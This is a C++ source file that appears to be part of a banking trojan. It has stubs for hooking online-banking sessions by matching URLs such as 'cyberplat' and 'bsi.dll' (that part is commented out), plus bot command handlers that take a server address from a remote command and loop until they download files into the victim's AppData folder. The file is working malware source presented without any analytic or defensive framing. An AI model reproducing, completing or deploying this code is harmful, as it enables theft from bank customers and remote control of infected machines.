#include "RuBnk.h"
#include "GetApi.h"
//#include "BSS.h"
#include <shlobj.h>
#include "loader.h"
#include "utils.h"

bool IbankHooksMain()
{
	//return IbankHooks();
	return false;
}

void IsBank( HINTERNET hRequest )
{

/*	

	DWORD dwUrlSize = 4096;
	char *Url		= (char*)MemAlloc( dwUrlSize );
	
	
	if ( Url )
	{
		if ( pInternetQueryOptionA( hRequest, INTERNET_OPTION_URL, Url, &dwUrlSize ) )
		{
	
			if ( CompareUrl( "*cyberplat*", Url ) )
			{
				//HookCyberplat();
				//InitScreenLib();
			} 

			else if ( CompareUrl( "*ibc*", Url ) )
			{
			//	InistHooks();
				InitScreenLib();
			} 

			#ifdef BSSH
				else if ( CompareUrl( "*bsi.dll*", Url ) )
				{
					BSSHooks();
					InitScreenLib();
				}
			#endif 

		}

		MemFree( Url );
	}
*/

}

bool HookCyberplatPCMain()
{
	return false;//HookCyberplatPC();
}

DWORD WINAPI IBlockThread(LPVOID lpData)
{
	PCHAR URL= (PCHAR)lpData;
	WCHAR ExplorerAddRu[] = {'\\','r','u',0};//
	WCHAR SysPathRu[MAX_PATH];
	
	while (true)
	{			
		pSHGetFolderPathW(NULL, 0x001a , NULL, 0, SysPathRu);	
		plstrcatW(SysPathRu, ExplorerAddRu );

		if (DownloadInFile( URL, &SysPathRu[0] ))
		{	
			break;
		}
	}
	return 0;
}

bool ExecuteIblock_Url(LPVOID Manager, PCHAR Command, PCHAR Args)
{
	PCHAR InputStr= STR::New(Args);
	return StartThread(IBlockThread,InputStr) != 0;

}

typedef struct
{
	PCHAR Server;
	PCHAR Hach;	
} VNC1, * PVNC1;

DWORD WINAPI IBlockProcessThread(LPVOID lpData)
{
	PVNC1 InputD = (PVNC1)lpData;
	

	WCHAR ExplorerAddRu[] = {'\\','H','p','r','\\',0};//
	WCHAR SysPathRu[MAX_PATH];
	pSHGetFolderPathW(NULL, 0x001a , NULL, 0, SysPathRu);	
	plstrcatW(SysPathRu, ExplorerAddRu );
	while((BOOL)pCreateDirectoryW(SysPathRu,NULL))
	{pSleep(1);}
	WCHAR *Dat= AnsiToUnicode(InputD->Hach,(DWORD)plstrlenA(InputD->Hach));
	plstrcatW(SysPathRu, Dat );
	MemFree(Dat);
	
	STR::Free(InputD->Hach);

	while (true)
	{
		if (DownloadInFile( InputD->Server, &SysPathRu[0] ))
		{	
			break;
		}
	}
	STR::Free(InputD->Server);
	return 0;
}

bool ExecuteIblock_processblock(LPVOID Manager, PCHAR Command, PCHAR Args)
{
	
	PCHAR PArgs=Args;
	
	// ������ ������ �������� ��������
	PVNC1 V1 = CreateStruct(VNC1);

	// ������ ���������
	V1->Server	= STR::GetLeftStr(PArgs, " ");
	V1->Hach	= STR::GetRightStr(PArgs, " ");
	
	return StartThread(IBlockProcessThread,V1) != 0;
}
